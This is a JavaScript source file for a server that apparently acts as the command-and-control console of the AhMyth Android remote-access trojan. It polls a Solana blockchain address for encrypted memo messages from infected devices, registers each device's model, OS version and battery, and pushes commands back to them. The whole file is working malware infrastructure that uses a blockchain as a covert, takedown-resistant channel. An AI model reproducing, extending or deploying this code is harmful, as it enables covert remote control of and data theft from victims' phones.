/**
 * Blockchain Emulator Server - Real Blockchain RPC
 * Headless version of Electron GUI blockchain listener
 * Polls real blockchain for clients and can send/receive commands
 */

const { Connection, PublicKey } = require('@solana/web3.js');
const crypto = require('crypto');
const bs58 = require('bs58');
const { sendCommand } = require('./AhMyth-Server/app/blockchain-operator');

// Configuration from environment or defaults
const RPC_URL = process.env.BLOCKCHAIN_RPC_URL || process.env.SOLANA_RPC_URL || 'https://api.devnet.solana.com';
const CHANNEL_ADDRESS = process.env.BLOCKCHAIN_CONTRACT_ADDRESS || process.env.SOLANA_CHANNEL_ADDRESS || '11111111111111111111111111111111';
const AES_KEY_HEX = process.env.BLOCKCHAIN_C2_AES_KEY || '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
const POLL_INTERVAL = parseInt(process.env.POLL_INTERVAL || '15000', 10); // 15 seconds

// State
const seenSignatures = new Set();
const chunkBuffers = new Map();
const clients = new Map(); // clientId -> client info
let listenerStartTime = Date.now();

// Decrypt memo payload (same as Electron GUI)
function decryptMemoPayload(hexPayload) {
  try {
    const buf = Buffer.from(hexPayload, 'hex');
    if (buf.length < 28) return null;
    const iv = buf.slice(0, 12);
    const tag = buf.slice(-16);
    const ciphertext = buf.slice(12, -16);
    const key = Buffer.from(AES_KEY_HEX, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(tag);
    const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    return decrypted.toString('utf8');
  } catch (e) {
    return null;
  }
}

// Extract memos from transaction
function extractMemosFromTx(tx) {
  const memos = [];
  if (!tx || !tx.meta) return memos;
  
  // Check log messages
  if (tx.meta.logMessages) {
    for (const logMsg of tx.meta.logMessages) {
      const memoMatch = logMsg.match(/Program log: Memo \(len \d+\): "?(.+?)"?$/);
      if (memoMatch && memoMatch[1]) {
        memos.push(memoMatch[1]);
      }
    }
  }
  
  // Check parsed instructions
  if (tx.transaction && tx.transaction.message && tx.transaction.message.instructions) {
    for (const instr of tx.transaction.message.instructions) {
      if (instr.parsed && typeof instr.parsed === 'string') {
        memos.push(instr.parsed);
      } else if (instr.parsed && instr.parsed.info && instr.parsed.info.memo) {
        memos.push(instr.parsed.info.memo);
      } else if (instr.data) {
        try {
          const decoded = Buffer.from(bs58.decode(instr.data)).toString('utf8');
          if (decoded.startsWith('RESP:') || decoded.startsWith('RESPCH:') || decoded.startsWith('CMD:') || decoded.startsWith('INIT:')) {
            memos.push(decoded);
          }
        } catch (e) {
          // Not base58 or not a memo
        }
      }
    }
  }
  
  return memos;
}

// Process blockchain response
function processResponse(decrypted, signature) {
  try {
    const parsed = JSON.parse(decrypted);
    const eventName = parsed.event || 'unknown';
    const data = parsed.data || parsed;
    const clientId = data.id || data.clientId || data.deviceId || parsed.id || signature.substring(0, 16);
    
    console.log(`[Client] ${eventName} from ${clientId.substring(0, 8)}...`);
    
    if (eventName === 'init') {
      if (!clients.has(clientId)) {
        clients.set(clientId, {
          id: clientId,
          connectedAt: Date.now(),
          lastSeen: Date.now(),
          data: data
        });
        console.log(`[✓] New client registered: ${clientId}`);
        console.log(`    Device: ${data.manf || 'Unknown'} ${data.model || 'Unknown'}`);
        console.log(`    Android: ${data.release || 'Unknown'}`);
      }
    } else if (eventName === 'heartbeat') {
      const client = clients.get(clientId);
      if (client) {
        client.lastSeen = Date.now();
        if (data.battery) client.battery = data.battery;
        console.log(`[♥] Heartbeat from ${clientId.substring(0, 8)}... (battery: ${data.battery || '?'}%)`);
      }
    } else {
      console.log(`[ℹ] Response from ${clientId.substring(0, 8)}...: ${eventName}`);
    }
  } catch (e) {
    console.error(`[✗] Failed to parse response: ${e.message}`);
  }
}

// Poll blockchain for client responses
async function pollBlockchain() {
  try {
    const connection = new Connection(RPC_URL, 'confirmed');
    const channelPubkey = new PublicKey(CHANNEL_ADDRESS);
    
    console.log(`[↻] Polling blockchain channel ${CHANNEL_ADDRESS.substring(0, 8)}...`);
    
    const sigInfos = await connection.getSignaturesForAddress(channelPubkey, { limit: 50 }, 'confirmed');
    
    let newTxCount = 0;
    for (const info of sigInfos) {
      if (!info || !info.signature) continue;
      if (seenSignatures.has(info.signature)) continue;
      
      // Skip old transactions (5 minute grace period)
      if (info.blockTime && listenerStartTime > 0) {
        const txTimeMs = info.blockTime * 1000;
        if (txTimeMs < (listenerStartTime - 300000)) {
          continue;
        }
      }
      
      seenSignatures.add(info.signature);
      newTxCount++;
      
      // Limit seen signatures set size
      if (seenSignatures.size > 1000) {
        const arr = Array.from(seenSignatures);
        seenSignatures.clear();
        arr.slice(-500).forEach(sig => seenSignatures.add(sig));
      }
      
      try {
        // Get transaction
        const tx = await connection.getParsedTransaction(info.signature, {
          commitment: 'confirmed',
          maxSupportedTransactionVersion: 0
        });
        
        if (!tx) continue;
        
        const memos = extractMemosFromTx(tx);
        
        for (const memo of memos) {
          if (!memo) continue;
          
          // Skip outgoing commands
          if (memo.startsWith('CMD:')) {
            continue;
          }
          
          // Handle chunked responses
          if (memo.startsWith('RESPCH:')) {
            const match = memo.match(/^RESPCH:([A-Za-z0-9]+):([0-9]+)\/([0-9]+):([0-9a-fA-F]+)$/);
            if (match) {
              const chunkId = match[1];
              const part = parseInt(match[2], 10);
              const total = parseInt(match[3], 10);
              const chunkHex = match[4];
              
              let entry = chunkBuffers.get(chunkId);
              if (!entry) {
                entry = { total, parts: new Array(total).fill(null), received: 0 };
              }
              if (!entry.parts[part - 1]) {
                entry.parts[part - 1] = chunkHex;
                entry.received += 1;
              }
              chunkBuffers.set(chunkId, entry);
              
              if (entry.received === entry.total) {
                const assembled = entry.parts.join('');
                chunkBuffers.delete(chunkId);
                const decrypted = decryptMemoPayload(assembled);
                if (decrypted) {
                  processResponse(decrypted, info.signature);
                }
              }
            }
            continue;
          }
          
          // Handle regular responses
          if (memo.startsWith('RESP:') || memo.startsWith('INIT:')) {
            const hexPayload = memo.substring(5);
            const decrypted = decryptMemoPayload(hexPayload);
            if (decrypted) {
              processResponse(decrypted, info.signature);
            }
          }
        }
      } catch (err) {
        console.error(`[✗] Error processing tx ${info.signature.substring(0, 8)}...: ${err.message}`);
      }
    }
    
    if (newTxCount > 0) {
      console.log(`[✓] Processed ${newTxCount} new transaction(s)`);
    }
    
    // Show client status
    if (clients.size > 0) {
      console.log(`[ℹ] Connected clients: ${clients.size}`);
      clients.forEach((client, id) => {
        const age = Math.floor((Date.now() - client.lastSeen) / 1000);
        console.log(`    - ${id.substring(0, 8)}... (last seen: ${age}s ago)`);
      });
    }
  } catch (err) {
    console.error(`[✗] Poll error: ${err.message}`);
  }
}

// Send command to client
async function sendCommandToClient(clientId, command, data = {}) {
  if (!clients.has(clientId)) {
    console.error(`[✗] Client ${clientId} not found`);
    return;
  }
  
  try {
    console.log(`[→] Sending command ${command} to ${clientId.substring(0, 8)}...`);
    const result = await sendCommand(command, { ...data, targetClient: clientId });
    console.log(`[✓] Command sent: ${result.txSig}`);
    return result;
  } catch (err) {
    console.error(`[✗] Failed to send command: ${err.message}`);
    throw err;
  }
}

// Start polling
console.log(`╔═══════════════════════════════════════════════════════════╗`);
console.log(`║   Blockchain Emulator Server (Real RPC)                ║`);
console.log(`║   RPC: ${RPC_URL}`);
console.log(`║   Channel: ${CHANNEL_ADDRESS}`);
console.log(`║   Poll Interval: ${POLL_INTERVAL}ms`);
console.log(`╚═══════════════════════════════════════════════════════════╝`);
console.log(`\n[Emulator] Starting blockchain listener...`);
console.log(`[Emulator] Polling for INIT/heartbeat messages...`);
console.log(`[Emulator] Use sendCommandToClient(clientId, command, data) to send commands\n`);

// Poll immediately
pollBlockchain().catch(err => {
  console.error(`[✗] Initial poll error: ${err.message}`);
});

// Then poll every interval
const pollInterval = setInterval(() => {
  pollBlockchain().catch(err => {
    console.error(`[✗] Poll error: ${err.message}`);
  });
}, POLL_INTERVAL);

// Export for programmatic use
module.exports = {
  sendCommandToClient,
  getClients: () => Array.from(clients.values()),
  getClient: (clientId) => clients.get(clientId),
  stop: () => {
    clearInterval(pollInterval);
    console.log('\n[Emulator] Stopped');
  }
};

// Handle graceful shutdown
process.on('SIGINT', () => {
  console.log('\n[Emulator] Shutting down...');
  clearInterval(pollInterval);
  process.exit(0);
});
